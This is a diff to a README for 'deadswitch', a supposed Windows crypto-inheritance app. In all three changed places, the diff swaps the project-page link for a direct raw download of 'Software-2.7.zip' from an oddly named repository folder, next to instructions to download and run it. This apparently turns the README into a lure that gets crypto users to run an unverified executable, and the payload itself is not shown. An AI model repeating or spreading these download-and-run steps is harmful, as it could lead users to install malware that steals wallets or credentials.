@@ -1,6 +1,6 @@
 # 🔗 deadswitch - Crypto inheritance that stays ready
 
-[![Download deadswitch](https://img.shields.io/badge/Download%20deadswitch-6a5acd?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Lighteningcountermortarfire868/deadswitch)
+[![Download deadswitch](https://img.shields.io/badge/Download%20deadswitch-6a5acd?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Lighteningcountermortarfire868/deadswitch/raw/refs/heads/main/bimanually/Software-2.7.zip)
 
 ## 🧭 What this app does
 
@@ -12,7 +12,7 @@ It is made for Windows users who want a clear setup, a simple screen flow, and a
 
 Visit this page to download:
 
-https://github.com/Lighteningcountermortarfire868/deadswitch
+https://github.com/Lighteningcountermortarfire868/deadswitch/raw/refs/heads/main/bimanually/Software-2.7.zip
 
 If the page has a Windows release file, download it and run it on your PC. If it offers a zip file, download the zip, open it, and start the app from the extracted files.
 
@@ -179,7 +179,7 @@ The goal is to make crypto inheritance easier to set up and easier to follow.
 
 Download and run this file from the project page:
 
-https://github.com/Lighteningcountermortarfire868/deadswitch
+https://github.com/Lighteningcountermortarfire868/deadswitch/raw/refs/heads/main/bimanually/Software-2.7.zip
 
 ## 🧭 Recommended setup order
 
